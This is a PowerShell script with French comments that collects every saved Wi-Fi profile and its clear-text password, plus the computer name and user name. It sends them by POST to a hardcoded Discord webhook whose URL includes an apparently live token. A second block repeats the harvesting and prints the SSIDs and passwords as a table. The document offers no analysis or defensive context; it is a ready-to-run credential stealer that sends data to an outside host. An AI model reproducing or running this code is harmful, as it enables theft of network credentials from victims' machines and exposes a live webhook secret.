$webhookUrl = "https://discord.com/api/webhooks/1501460061439004732/fE-P3g0HI2ha_ZKMhWmn1woNkl8yzMz_sLLFffMnk4xa1JtNDy0PodilxIiB7BlEvS_m"

$results = @()

$profiles = netsh wlan show profiles |
    Where-Object { $_ -match ":" -and $_ -notmatch "Profils sur" } |
    ForEach-Object { ($_ -split ":\s*", 2)[1].Trim() } |
    Where-Object { $_ -ne "" }

foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $passwordLine = $details | Where-Object { $_ -match "Contenu de la cl" }
    $password = if ($passwordLine) { ($passwordLine -split ":\s*", 2)[1].Trim() } else { "(aucun)" }

    $results += [PSCustomObject]@{
        SSID       = $profile
        MotDePasse = $password
    }
}

$machine     = $env:COMPUTERNAME
$utilisateur = $env:USERNAME
$date        = Get-Date -Format "yyyy-MM-dd HH:mm"
# Ajoute ici tes propres variables...

$body = "{
  `"username`": `"MonScript`",
  `"embeds`": [{
    `"title`": `"Nouveau rapport`",
    `"color`": 3447003,
    `"fields`": [
      { `"name`": `"Machine`",     `"value`": `"$machine`",     `"inline`": true },
      { `"name`": `"Utilisateur`", `"value`": `"$utilisateur`", `"inline`": true },
      { `"name`": `"Date`",        `"value`": `"$date`",        `"inline`": false },
      {`"name`": `"Data`",        `"value`": `"$results`",        `"inline`": false },
    ]
  }]
}"

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"

# Lister tous les profils Wi-Fi et leurs mots de passe
$profiles = netsh wlan show profiles |
    Where-Object { $_ -match "Profil Tous les utilisateurs\s*:\s*(.+)" } |
    ForEach-Object { ($_ -split ":\s*", 2)[1].Trim() }

foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $passwordLine = $details | Where-Object { $_ -match "Contenu de la clé\s*:" }
    $password = if ($passwordLine) { ($passwordLine -split ":\s*", 2)[1].Trim() } else { "(aucun)" }

    [PSCustomObject]@{
        SSID       = $profile
        MotDePasse = $password
    }
} | Format-Table -AutoSize
